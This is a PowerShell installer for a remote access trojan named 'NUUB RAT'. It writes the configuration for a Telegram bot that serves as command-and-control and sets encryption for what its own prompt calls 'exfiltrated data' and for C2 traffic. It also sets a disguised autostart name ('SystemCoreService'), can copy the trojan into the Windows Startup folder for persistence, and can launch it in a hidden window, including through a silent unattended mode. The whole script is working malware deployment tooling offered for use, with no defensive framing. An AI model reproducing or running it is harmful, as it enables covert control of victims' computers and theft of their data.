# NUUB RAT - PowerShell Installer
# Run: powershell -ExecutionPolicy Bypass -File installer.ps1
#
# Silent mode (unattended):
#   powershell -ExecutionPolicy Bypass -File installer.ps1 -Silent -BotToken "123:ABC" -AdminId "123456"
#
# Parameters:
#   -BotToken     Telegram bot token
#   -AdminId      Telegram admin chat ID
#   -PcId         PC identifier (default: "PC-001")
#   -EncPassword  Encryption password (generates random if empty)
#   -Heartbeat    Heartbeat interval in minutes (default: 30)
#   -Silent       Run without prompts (requires -BotToken and -AdminId)

param(
    [string]$BotToken = "",
    [string]$AdminId = "",
    [string]$PcId = "PC-001",
    [string]$EncPassword = "",
    [int]$Heartbeat = 30,
    [switch]$Silent
)

function Write-Banner {
    Write-Host ""
    Write-Host " _   _ _   _  ___ _____    ___  ___   _   _  _____" -ForegroundColor Cyan
    Write-Host "| | | | \ | |/ _ \_   _|  / _ \|_ _| \ | |/ / _ \" -ForegroundColor Cyan
    Write-Host "| | | |  \| | | | || |   | | | || ||  \| | | | |" -ForegroundColor Cyan
    Write-Host "| |_| | |\  | |_| || |   | |_| || || |\  | |_| |" -ForegroundColor Cyan
    Write-Host " \___/|_| \_|\___/ |_|    \___/___|_| \_|\___/" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "   Interactive Installer v2.0" -ForegroundColor Yellow
    Write-Host ""
}

function Read-Input {
    param(
        [string]$Prompt,
        [string]$Default = "",
        [switch]$Secret
    )

    if ($Default) {
        $display = "$Prompt [$Default]: "
    } else {
        $display = "$Prompt: "
    }

    if ($Secret) {
        $secure = Read-Host $display -AsSecureString
        $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        $value = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
        [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
    } else {
        $value = Read-Host $display
    }

    if (-not $value -and $Default) { return $Default }
    return $value
}

function Read-YesNo {
    param(
        [string]$Prompt,
        [bool]$Default = $false
    )

    if ($Default) {
        $def = "Y/n"
    } else {
        $def = "y/N"
    }

    $value = Read-Host "$Prompt ($def)"
    if (-not $value) { return $Default }
    return ($value -eq 'y' -or $value -eq 'yes')
}

function Read-Number {
    param(
        [string]$Prompt,
        [int]$Default = 30
    )

    $value = Read-Host "$Prompt [$Default]"
    if (-not $value) { return $Default }

    $num = 0
    if ([int]::TryParse($value, [ref]$num)) {
        return $num
    }
    return $Default
}

function New-RandomString {
    param([int]$Length = 16)

    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $result = -join ((0..$Length) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })
    return $result
}

# Main installer
Clear-Host
Write-Banner

if ($Silent) {
    Write-Host "Silent mode installation`n"

    # Validate required params
    if (-not $BotToken) {
        Write-Host "[ERROR] Silent mode requires -BotToken" -ForegroundColor Red
        exit 1
    }
    if (-not $AdminId) {
        Write-Host "[ERROR] Silent mode requires -AdminId" -ForegroundColor Red
        exit 1
    }

    $botToken = $BotToken
    $adminIds = @($AdminId)
    $pcId = $PcId
    $encPassword = if ($EncPassword) { $EncPassword } else { New-RandomString 16 }
    $c2Key = ""
    $heartbeat = $Heartbeat

    Write-Host "[OK] Using provided parameters (silent mode)" -ForegroundColor Green
} else {
    Write-Host "This installer will configure NUUB RAT for your use.`n"

    # Check for existing config
    if (Test-Path "config.json") {
        Write-Host "[WARNING] config.json already exists!" -ForegroundColor Yellow
        if (-not (Read-YesNo "Overwrite?")) {
            Write-Host "Setup cancelled."
            exit
        }
    }

    # Step 1: Telegram Bot Token
    Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
    Write-Host "[1/6] Telegram Bot Configuration" -ForegroundColor Cyan
    Write-Host "$('=' * 50)" -ForegroundColor Cyan
    Write-Host "Create a bot via @BotFather on Telegram and get your token.`n"

    $botToken = Read-Input "Bot Token" -Secret
    if (-not $botToken) {
        Write-Host "[ERROR] Bot token is required!" -ForegroundColor Red
        exit 1
    }

    # Step 2: Admin Chat IDs
    Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
    Write-Host "[2/6] Admin Configuration" -ForegroundColor Cyan
    Write-Host "$('=' * 50)" -ForegroundColor Cyan
    Write-Host "Send /start to your bot and note your chat ID.`n"

    $adminIds = @()
    $firstId = Read-Input "Admin Chat ID"
    if ($firstId) {
        $adminIds += $firstId
    }

    while (Read-YesNo "Add another admin?") {
        $adminId = Read-Input "Admin Chat ID"
        if ($adminId) {
            $adminIds += $adminId
        }
    }

    if ($adminIds.Count -eq 0) {
        Write-Host "[ERROR] At least one admin ID is required!" -ForegroundColor Red
        exit 1
    }

    # Step 3: PC Identifier
    Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
    Write-Host "[3/6] PC Configuration" -ForegroundColor Cyan
    Write-Host "$('=' * 50)" -ForegroundColor Cyan

    $pcId = Read-Input "PC Identifier" "PC-001"

    # Step 4: Encryption Password
    Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
    Write-Host "[4/6] Security Configuration" -ForegroundColor Cyan
    Write-Host "$('=' * 50)" -ForegroundColor Cyan
    Write-Host "This password encrypts all exfiltrated data.`n"

    $encPassword = Read-Input "Encryption Password" -Secret
    if (-not $encPassword) {
        $encPassword = New-RandomString 16
        Write-Host "Generated random password: $encPassword" -ForegroundColor Green
    }

    # Step 5: Advanced Configuration
    Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
    Write-Host "[5/6] Advanced Configuration" -ForegroundColor Cyan
    Write-Host "$('=' * 50)" -ForegroundColor Cyan

    $useC2Encryption = Read-YesNo "Enable C2 traffic encryption?" $false
    $c2Key = ""
    if ($useC2Encryption) {
        $c2Key = Read-Input "C2 Encryption Key" -Secret
        if (-not $c2Key) {
            $c2Key = New-RandomString 32
            Write-Host "Generated random C2 key: $c2Key" -ForegroundColor Green
        }
    }

    $heartbeat = Read-Number "Heartbeat interval (minutes)" 30

    # Step 6: Generate Config
    Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
    Write-Host "[6/6] Generating Configuration" -ForegroundColor Cyan
    Write-Host "$('=' * 50)" -ForegroundColor Cyan
}

$config = @{
    telegram_bot_token = $botToken
    admin_chat_id = [long]$adminIds[0]
    admin_chat_ids = $adminIds | ForEach-Object { [long]$_ }
    pc_identifier = $pcId
    encryption_password = $encPassword
    master_log_filename = "log_master.txt"
    activity_log_filename = "activity_log.csv"
    auto_start_entry_name = "SystemCoreService"
    log_filename = "nuub.log"
    heartbeat_interval_minutes = $heartbeat
    c2_encryption_key = $c2Key
}

# Write config
$config | ConvertTo-Json | Out-File -FilePath "config.json" -Encoding UTF8

Write-Host "`n[OK] Configuration saved to config.json" -ForegroundColor Green

# Summary
Write-Host "`n$('=' * 50)" -ForegroundColor Cyan
Write-Host "INSTALLATION COMPLETE" -ForegroundColor Green
Write-Host "$('=' * 50)" -ForegroundColor Cyan

Write-Host "`nConfiguration Summary:"
Write-Host "  Bot Token: $($botToken.Substring(0, [Math]::Min(10, $botToken.Length)))..."
Write-Host "  Admin IDs: $($adminIds -join ', ')"
Write-Host "  PC ID: $pcId"
Write-Host "  C2 Encryption: $(if ($useC2Encryption) {'Enabled'} else {'Disabled'})"
Write-Host "  Heartbeat: $heartbeat minutes"

Write-Host "`nNext Steps:"
Write-Host "  1. Place config.json in the same directory as nuub.exe"
Write-Host "  2. Run: .\nuub.exe"
Write-Host "  3. Send /start to your bot to verify connection"

# Optional: Add to startup
if (Read-YesNo "`nAdd to Windows startup?" $false) {
    $startupPath = [Environment]::GetFolderPath('Startup')
    $source = Join-Path $PSScriptRoot "nuub.exe"
    $dest = Join-Path $startupPath "nuub.exe"

    if (Test-Path $source) {
        Copy-Item $source $dest -Force
        Write-Host "[OK] Added to startup: $dest" -ForegroundColor Green
    } else {
        Write-Host "[INFO] nuub.exe not found in current directory" -ForegroundColor Yellow
    }
}

# Optional: Run now
if (Read-YesNo "`nRun the RAT now?" $false) {
    Write-Host "`nStarting NUUB RAT..." -ForegroundColor Yellow
    Start-Process "nuub.exe" -WindowStyle Hidden
}

Write-Host "`nInstallation finished!" -ForegroundColor Green
